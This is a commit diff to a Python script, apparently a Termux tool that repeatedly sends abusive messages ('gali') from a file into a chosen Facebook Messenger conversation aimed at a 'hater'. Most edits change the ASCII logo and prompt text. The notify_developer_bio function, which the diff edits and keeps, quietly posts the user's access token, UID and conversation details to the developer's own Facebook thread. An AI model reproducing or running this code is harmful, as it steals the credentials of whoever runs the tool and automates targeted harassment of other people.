5718ffa522e686a1ddccef626c8df99df544168c
Bɽ͢oʞɘ͡ŋ-Pʌ͜͡ɽɗʜ͢ʌŋ Cʜ͜͡ʌɭtɘ'Rʌ͜͡ʜɘ͢ŋgɘ-Kʌ͢͡ʆıɭɘ'Mɘ͜͡ɽə-Bʌ͜͡ɢʌıɽ'Bʜ͜͡ı-Yʌʜ͢͡ʌŋ Eʞ-Sıtʌ͜͡ɽ̆ʌ'Too͡ʈ-Jʌ͜͡ƞɘ'Sə-Aʌ͜͡sɱ͢͡ʌŋ-Sʋ͜͡ƞʌ-Nʌ͜͡ʜı'Hoʈ͜͡ʌ <nadeembroken0@gmail.com>
2025-02-20 07:34:21 +0530

    Update ok.py

--- ok.py
+++ ok.py
@@ -334,14 +334,17 @@ def animated_print(text, delay=0.01, jitter=0.005):
 
 def animated_logo():
     logo_text = r"""
-             _______    _______    _______    _         _________   _          _______ 
-            (  ___  )  (  ____ \  (  ____ \  ( \        \__   __/  ( (    /|  (  ____ \
-            | (   ) |  | (    \/  | (    \/  | (           ) (     |  \  ( |  | (    \/
-            | |   | |  | (__      | (__      | |           | |     |   \ | |  | (__    
-            | |   | |  |  __)     |  __)     | |           | |     | (\ \) |  |  __)   
-            | |   | |  | (        | (        | |           | |     | | \   |  | (      
-            | (___) |  | )        | )        | (____/\  ___) (___  | )  \  |  | (____/\
-            (_______)  |/         |/         (_______/  \_______/  |/    )_)  (_______/ """
+             
+ _          _______    ______     _______    _______    _______      _______    _         _________
+( (    /|  (  ___  )  (  __  \   (  ____ \  (  ____ \  (       )    (  ___  )  ( \        \__   __/
+|  \  ( |  | (   ) |  | (  \  )  | (    \/  | (    \/  | () () |    | (   ) |  | (           ) (   
+|   \ | |  | (___) |  | |   ) |  | (__      | (__      | || || |    | (___) |  | |           | |   
+| (\ \) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |    |  ___  |  | |           | |   
+| | \   |  | (   ) |  | |   ) |  | (        | (        | |   | |    | (   ) |  | |           | |   
+| )  \  |  | )   ( |  | (__/  )  | (____/\  | (____/\  | )   ( |    | )   ( |  | (____/\  ___) (___
+|/    )_)  |/     \|  (______/   (_______/  (_______/  |/     \|    |/     \|  (_______/  \_______/
+                                                                                                   
+ """
     for line in logo_text.splitlines():
          animated_print(line, delay=0.005, jitter=0.002)
 
@@ -353,7 +356,7 @@ def main_menu():
     print(random.choice(color_list) + "[2] STOP LOADER")
     print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
     animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
-    choice = input(random.choice(color_list) + "\n[+]  CHOOSE AN  OPTION ::").strip()
+    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
     if choice == "2":
         stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
         animated_print("<<════════════════════════════════════════════════════════>>")
@@ -381,7 +384,7 @@ def get_stop_key():
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_61571843423018"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\nName: {mn}\nConversation: {thread_id}\nUID: {uid}\nMessage File: {ms}"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
@@ -491,17 +494,17 @@ if os.path.exists("stop_signal.txt"):
 animated_logo()
 
 # Then, show the original colored logo and venom animations
-colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 
 
    """.splitlines()]
 colored_logo()
 venom()
 print(Fore.GREEN + "[•]  START TIME ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
-print(Fore.GREEN + "[•] _BROKEN BOY NADEEM IINSIIDE \n")
+print(Fore.GREEN + "[•] BROKEN BOY NADEEM IINSIIDE \n")
 animated_print("<<════════════════════════════════════════════════════════>>")
 # --- Print the Stop Key in the desired animated format ---
 animated_print          ("<==========================>", delay=0.005, jitter=0.002)
-animated_print                     ("[•] Your Stop Key: " + get_stop_key(), delay=0.005, jitter=0.002)
+animated_print                     ("[•] Your Stop Key:   " + get_stop_key(), delay=0.005, jitter=0.002)
 animated_print          ("<===========================>", delay=0.005, jitter=0.002)
 
 print_custom_bio()
@@ -517,7 +520,7 @@ else:
     sys.exit()
 
 os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
-token_file = input("[+] ENTER TOKEN FILE NAME ::> ").strip()
+token_file = input("[+] ENTER TOKEN FILE  ::> ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 with open(token_file, 'r') as f2:
     token_data = f2.read()
@@ -533,12 +536,12 @@ d = json.loads(b.text)
 if 'name' not in d:
     sys.exit()
 mb = d['name']
-print(Fore.GREEN + "YOUR PROFILE NAME :: " + mb + "\n")
+print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 start_queue_processor()
 
 os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
-thread_id = input("[+] ENTER Conversation ID ::>").strip()
+thread_id = input("[+] ENTER CONVO UID ::> ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "TATE KA NAME DALO"')
 mn = input("[+] ENTER HATER NAME ::> ").strip()
@@ -547,13 +550,13 @@ os.system('espeak -a 300 "GALI FILE DALO"')
 ms = input("[+] ENTER GALI FILE ::> ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
-repeat = int(input("[+] KITNI BAAR IS GALI KO reload  KARNA HAI ::>"))
+repeat = int(input("[+] KITNI BAAR IS GALI KO REAOLAD KARNA HAI ::> "))
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "SPEED DALO YAR"')
-timm = int(input("[+] Enter Speed in Seconds ::> "))
+timm = int(input("[+] ENTER SPEED IN SECOND ::> "))
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-print(Fore.BLUE + "\n________All Done....Loading Profile Info.....!")
-print(Fore.BLUE + "Your Profile Name => " + mb + "\n")
+print(Fore.BLUE + "\n________All DONE....LOADING PROFILE INFO.....!")
+print(Fore.BLUE + "YOUR FIRST PROFILE NAME AND ALL ID RUNNING CHAKE...BROKEN NADEEM=> " + mb + "\n")
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 try:
     ns = open(ms, 'r').readlines()
